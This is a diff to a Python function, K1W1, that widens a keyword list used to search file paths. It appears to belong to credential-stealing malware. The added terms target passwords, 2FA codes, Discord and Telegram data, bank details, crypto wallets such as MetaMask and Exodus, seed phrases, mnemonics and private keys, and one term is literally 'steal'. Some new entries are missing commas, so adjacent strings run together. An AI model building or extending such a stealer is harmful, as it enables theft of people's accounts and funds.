@@ -1255,18 +1255,17 @@ def K1W1():
         "mot_de_passe",
         "login",
         "secret",
+        "bot",
+        "atomic",
         "account",
         "acount",
         "paypal",
         "banque",
-        "account",
+        "bot",
         "metamask",
         "wallet",
-        "wallets",
         "crypto",
         "exodus",
-        "seed",
-        "seedphrase"
         "discord",
         "2fa",
         "code",
@@ -1274,8 +1273,33 @@ def K1W1():
         "compte",
         "token",
         "backup",
-        "secret"
-        ]
+        "secret",
+        "seed",
+        "mnemonic"
+        "memoric",
+        "private",
+        "key",
+        "passphrase",
+        "pass",
+        "phrase",
+        "steal",
+        "bank",
+        "info",
+        "casino",
+        "prv",
+        "privé",
+        "prive",
+        "telegram",
+        "identifiant",
+        "personnel",
+        "trading"
+        "bitcoin",
+        "sauvegarde",
+        "funds",
+        "récupé",
+        "recup",
+        "note",
+    ]
 
     wikith = []
     for patt in path2search: 
